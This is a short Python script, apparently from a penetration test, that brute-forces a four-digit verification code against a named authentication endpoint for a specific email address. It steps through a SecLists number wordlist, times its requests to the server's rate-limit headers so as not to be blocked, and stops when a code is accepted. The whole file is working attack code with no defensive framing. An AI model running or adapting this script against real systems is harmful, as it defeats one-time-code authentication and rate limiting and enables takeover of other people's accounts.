# -*- coding: utf-8 -*-
from requests import post
from time import sleep
from datetime import datetime

url = 'http://uzp-test.ragulin.ru/api/auth/check-code'
user = 'ragulinma@mail.ru'
codes_file = 'C:\\Future\\D\\Pentest\\SecLists-master\\numbers_4.txt'


def count_perf(f):
    def wrapper(*args, **kwargs):
        time_init = datetime.now()
        result = f(*args, **kwargs)
        time_end = datetime.now()
        total = time_end - time_init
        print('Took time: {}'.format(total))
        return result

    return wrapper


@count_perf
def laravel_bypass():
    print('[+] Start brute force code')
    with open(codes_file, 'r', encoding='utf-8') as f:
        for code in f:
            r = post(url, json={"code": f"{code.strip()}",
                                "email": f"{user}"},
                     headers={'Content-Type': 'application/json'})
            if 'error' not in r.text or r.status_code == 200:
                print(f"[+] Security code: {code}")
                break
            if r.status_code == 422:
                print('[-] Something is broken on a server')
                break
            if 'X-RateLimit-Remaining' in r.headers:
                est = r.headers['X-RateLimit-Remaining']
                if int(est) > 1:
                    sleep(1)
                    continue
                else:
                    sleep(10)


if __name__ == '__main__':
    laravel_bypass()
